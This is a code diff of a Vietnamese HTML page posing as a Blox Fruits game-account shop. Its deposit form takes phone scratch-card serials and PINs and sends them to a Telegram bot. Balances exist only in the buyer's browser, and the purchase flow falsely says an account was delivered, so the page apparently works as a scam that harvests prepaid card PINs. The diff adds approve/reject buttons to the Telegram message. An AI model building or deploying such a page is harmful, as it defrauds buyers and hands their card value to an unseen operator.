@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop Blox Fruits - Nạp Tiền & Mua Hàng</title>
+    <title>Shop Blox Fruits - Nạp Tiền & Mua Hàng Tự Động</title>
     <style>
         :root {
             --primary: #f59e0b;
@@ -186,7 +186,7 @@
 <body>
 
     <div class="container">
-        <!-- 1. ĐĂNG NHẬP -->
+        <!-- 1. MÀN HÌNH ĐĂNG NHẬP / ĐĂNG KÝ -->
         <div id="authScreen">
             <h2>🔐 Đăng Nhập / Đăng Ký</h2>
             <div class="form-group">
@@ -249,7 +249,7 @@
             <div class="form-group">
                 <label>Hình thức nạp tiền</label>
                 <select id="depositMethod" onchange="changeDepositMethod()">
-                    <option value="card">Thẻ Cào Điện Thoại (Tự động báo Telegram)</option>
+                    <option value="card">Thẻ Cào Điện Thoại (Báo Telegram có nút duyệt)</option>
                     <option value="bank" disabled>Chuyển Khoản Ngân Hàng / Momo (Đang bảo trì ❌)</option>
                 </select>
             </div>
@@ -293,10 +293,10 @@
             <button onclick="goBackHome()" class="secondary-btn">Quay lại trang chủ</button>
         </div>
 
-        <!-- 4. THÔNG BÁO NẠP THẺ THÀNH CÔNG / CHỜ DUYỆT -->
+        <!-- 4. THÔNG BÁO GỬI THẺ THÀNH CÔNG -->
         <div id="successScreen" class="hidden" style="text-align: center; padding: 15px 0;">
             <h2 style="color: #22c55e;">🎉 Gửi Thẻ Thành Công!</h2>
-            <p style="font-size: 12px; color: var(--gray); margin-bottom: 15px;">Thông tin thẻ đã gửi về Telegram của Admin để duyệt cộng tiền vào ví cho bạn.</p>
+            <p style="font-size: 12px; color: var(--gray); margin-bottom: 15px;">Thông tin thẻ đã gửi về Telegram kèm nút bấm duyệt để cộng tiền vào ví cho bạn.</p>
             <button onclick="goBackHome()">Về Trang Chủ</button>
         </div>
     </div>
@@ -382,11 +382,26 @@
                             `🔑 *Mã PIN:* \`${pin}\`\n` +
                             `⏱ *Thời gian:* ${new Date().toLocaleString('vi-VN')}`;
 
+            // Tạo nút bấm trực tiếp ngay dưới tin nhắn thông báo nạp thẻ
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Duyệt Thẻ", callback_data: "approve_deposit" },
+                        { text: "❌ Từ Chối", callback_data: "reject_deposit" }
+                    ]
+                ]
+            };
+
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: TELEGRAM_CHAT_ID, 
+                    text: message, 
+                    parse_mode: 'Markdown',
+                    reply_markup: inlineKeyboard
+                })
             }).catch(err => console.log(err));
 
             document.getElementById('depositScreen').classList.add('hidden');
@@ -399,7 +414,7 @@
 
         function buyProduct(productName, price) {
             if (userBalances[currentUser] < price) {
-                alert(`❌ Số dư trong ví của bạn không đủ (${userBalances[currentUser].toLocaleString('vi-VN')} VNĐ). Vui lòng bấm "Nạp Tiền" để nạp thêm!`);
+                alert(`❌ Số dư ví của bạn không đủ (${userBalances[currentUser].toLocaleString('vi-VN')} VNĐ). Vui lòng bấm "Nạp Tiền" để nạp thêm!`);
                 openDepositScreen();
                 return;
             }
@@ -410,7 +425,7 @@
                 localStorage.setItem('shop_balances', JSON.stringify(userBalances));
                 updateUI();
 
-                alert(`🎉 Mua thành công tài khoản: "${productName}"!\n\nHệ thống đã trừ tiền trong ví. Thông tin tài khoản game đã được gửi vào lịch sử mua hàng của bạn!`);
+                alert(`🎉 Mua thành công tài khoản: "${productName}"!\n\nHệ thống đã trừ tiền trong ví. Thông tin tài khoản game đã được giao cho bạn!`);
             }
         }
     </script>
